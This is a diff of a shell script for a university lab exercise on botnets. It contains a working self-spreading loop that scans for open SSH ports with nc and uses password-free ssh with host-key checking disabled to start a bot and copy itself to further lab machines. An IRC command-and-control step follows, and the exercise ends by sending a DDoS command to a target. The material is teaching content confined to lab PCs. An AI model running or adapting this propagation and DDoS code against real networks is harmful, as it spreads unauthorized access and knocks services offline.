@@ -1,29 +1,35 @@
+# [DISCLAIMER]
+
+# Do not use any of the code in this lab to do anything stupid
+# (definitely do not target real domains), you will get caught!
+
+# This code was created without any security or protection in mind
+# and many things are simplified to demonstrate the concept of botnets
+# for the purposes of the lab.
+
+
 # [OVERVIEW]
 
 # This will be an interactive lab.
 # Make sure to read all instructions carefully.
 # Wherever there is an ANSWER or TODO, you must complete them to get full marks.
 
-# EXPLAIN TYPICAL BOTNET LIFECYCLE, WHICH PARTS WE ARE COVERING, WHICH PARTS WE ARE SKIPPING AND WHY
+# In this lab, we will be exploring 4 of the 5 phases of the botnet lifecycle:
+# Infection -> Propagation -> Connection -> Control
+# We will not be covering Maintainence & Upgrading.
 
-# Why can we ssh into these lab pcs without having to provide a password?
-# Normally, we would have to create backdoors for each machine that we break into.
-# However, in this case, we are already logged in as a user,
-# so switching to different machines in the local network does not require a password.
-
-# Why do we only need to copy the botnet files to just one lab pc?
-# The answer is NFS.
 
 # [PERMISSIONS]
 
-# Run "chmod u+x c2.py bot.py botnet.sh"
+# Run "chmod u+x c2.py bot.py botnet.sh kill_botnet.sh"
 
 
 # [RUNNING IRC SERVER]
 
 # Run "ifconfig" and look for the ipv4 address of the eno1 network interface.
 # Edit the "ircd.yaml" file.
-# Under "server -> listeners", replace 127.0.0.1 with the correct address.
+# Under "server -> listeners", replace 127.0.0.1 with this address.
+# This will be the ip address that our botmaster and bots will connect to.
 
 # QUESTION: What is the standard plaintext port that our bots use to connect to the IRC server?
 # ANSWER: 
@@ -31,10 +37,12 @@
 
 # [JOINING IRC SERVER AS BOTMASTER]
 
+# In a separate terminal, run "./c2.py <irc_server_ip>" to start the C2 server on this lab pc.
+
 
 # [RECONNAISSANCE]
 
-# While logged into a lab pc:
+# In a separate terminal:
 
 # Run "ssh dh2026pc01" and then "ifconfig".
 
@@ -55,45 +63,68 @@
 # Make a note of the endings (last byte) of these two ip addresses.
 # You will pass them as arguments when you call this script later.
 
+
+# [INFECTION -> PROPAGATION -> CONNECTION]
+
+# TODO: Replace this with the ip address of the lab pc
+# you wish to run the IRC server on.
+irc_server="142.1.46.4"
+
+script_dir=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
+
 ip_prefix="142.1.46."
 range_start=$1
 range_end=$2
-
-
-# [INFECTION / MULTIPLICATION]
-
-SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
 
 i=$range_start
 
 # Iterate over ip range to find new hosts to infect.
 while [ $i -le $range_end ]; do
+    echo "$i, $range_end"
+
     ip_address="$ip_prefix$i"
 
-    nc -zv $ip_address ssh
+    nc -zv -w 1 $ip_address ssh
     if [ $? -eq 0 ]; then
-        # SSH port was open.
+        # SSH port was open. Infect the host.
 
-        new_range_end=$(( range_end / 2 ))
-        new_range_start=$(( new_range_end + 1 ))
+        # Divide and conquer:
+        # Assign a partition of the ip range to the new bot.
+        right_range_end=$range_end
+        left_range_end=$(( i + ((range_end - i) / 2) ))
+        right_range_start=$(( left_range_end + 1 ))
 
-        if [[ $new_range_start -eq $i ]]; then
-            new_range_start++
-        fi
+        # Normally, this is when we attempt to gain unauthorized access to each victim machine,
+        # however, since we are already logged in as a user, we can ssh into the other machines
+        # for free without having to provide a password. This is also where we introduce our
+        # botnet files into each victim machine, however, this is already taken care of by NFS.
 
-        # Divide and conquer: use infected bots to infect more bots and multiply.
+        # Infect host and use it to recursively infect more victims.
         # TODO: Replace <> and <> with the scripts that we want to execute on the victim lab pc.
-        ssh -o "StrictHostKeyChecking no" $ip_address "cd $SCRIPT_DIR; ./bot.py &; ./botnet.sh $new_range_start $range_end &;"
+        ssh -o "StrictHostKeyChecking no" $ip_address "cd $script_dir; ./bot.py $irc_server & ./botnet.sh $right_range_start $right_range_end &" &
 
-        range_end=$new_range_end
+        range_end=$left_range_end
     fi
 
-    i++
+    (( ++i ))
 done
 
+# After you have completed all of the previous steps, in a separate terminal,
+# call "./botnet.sh <range_start> <range_end>" with the appropriate arguments
+# to begin infecting the lab pcs.
 
-# CONTROL
 
-# Send the command "DDOS TCP localhost 8080 8 10" from the botmaster IRC client.
-# QUESTION: What does this command do? (look through bot.py if you are unsure)
+# [CONTROL]
+
+# Run the command "NAMES #botnet" in the botmaster IRC client.
+
+# QUESTION: What does this command do?
+# ANSWER: 
+
+# In a separate terminal, run the command "python3 -m http.server -b <ip_address> 8080"
+# to start the victim server (run "ifconfig" if you don't remember).
+
+# Send the command "DDOS TCP <target_ip> <target_port> 8 10" from the botmaster IRC client.
+
+# QUESTION: What does this command do?
 # ANSWER: 
